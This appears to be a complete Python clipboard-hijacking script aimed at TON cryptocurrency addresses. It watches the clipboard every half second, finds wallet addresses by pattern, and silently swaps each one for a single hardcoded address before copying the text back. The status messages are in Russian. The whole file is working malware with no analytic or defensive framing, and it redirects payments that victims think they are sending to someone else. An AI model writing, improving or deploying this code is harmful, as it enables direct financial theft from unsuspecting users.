import re
import time
import pyperclip

def check_address_validity(address):
    address = address.strip()
    if not (address.startswith('EQ') or address.startswith('UQ')):
        return False
    if len(address) not in (48, 51):
        return False
    if not re.match(r'^[A-Za-z0-9\-_]+$', address):
        return False
    return True

def find_potential_addresses(text):
    pattern = r'\b[EUQ][A-Za-z0-9\-_]{43,50}\b'
    candidates = re.findall(pattern, text)
    valid_addresses = []
    for candidate in candidates:
        if check_address_validity(candidate):
            valid_addresses.append(candidate)
    return valid_addresses

def replace_addresses(text, addresses):
    for addr in addresses:
        pattern = re.escape(addr)
        text = re.sub(pattern, 'UQBYwxcEFF-Iqfn1gQ6n-inDnuIgwDH64yRiUGUWdHlRGTaA', text)
    return text

def main():
    previous_text = ''
    while True:
        time.sleep(0.5)
        current_text = pyperclip.paste()
        if current_text != previous_text:
            previous_text = current_text
            print(f"\nОбнаружен новый текст: {current_text}")
            addresses = find_potential_addresses(current_text)
            if addresses:
                print(f"Обнаружены {len(addresses)} адреса, приступаю к замене...")
                new_text = replace_addresses(current_text, addresses)
                pyperclip.copy(new_text)
                print("Обновленный текст скопирован в буфер обмена.")
            else:
                print("Адреса не найдены в текущем тексте.")

if __name__ == '__main__':
    main()